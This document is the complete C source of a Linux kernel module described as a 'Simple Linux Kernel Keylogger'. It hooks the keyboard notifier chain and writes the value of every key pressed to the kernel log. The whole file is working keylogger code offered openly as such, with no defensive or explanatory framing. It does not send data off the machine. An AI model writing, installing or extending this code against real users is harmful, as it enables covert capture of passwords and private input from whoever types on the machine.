#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/keyboard.h>
#include <linux/input.h>

static int keypress_notify(struct notifier_block *nb, unsigned long action, void *data) {
    struct keyboard_notifier_param *key_param = data;
    if (action == KBD_KEYSYM && key_param->down) {
        pr_info("KeyLogger: Key pressed: %x\n", key_param->value);
    }
    return NOTIFY_OK;
}

static struct notifier_block keylogger_notifier_block = {
    .notifier_call = keypress_notify
};

static int __init keylogger_init(void) {
    pr_info("KeyLogger: Initialization\n");
    register_keyboard_notifier(&keylogger_notifier_block);
    return 0;
}

static void __exit keylogger_exit(void) {
    pr_info("KeyLogger: Exiting\n");
    unregister_keyboard_notifier(&keylogger_notifier_block);
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Simple Linux Kernel Keylogger");
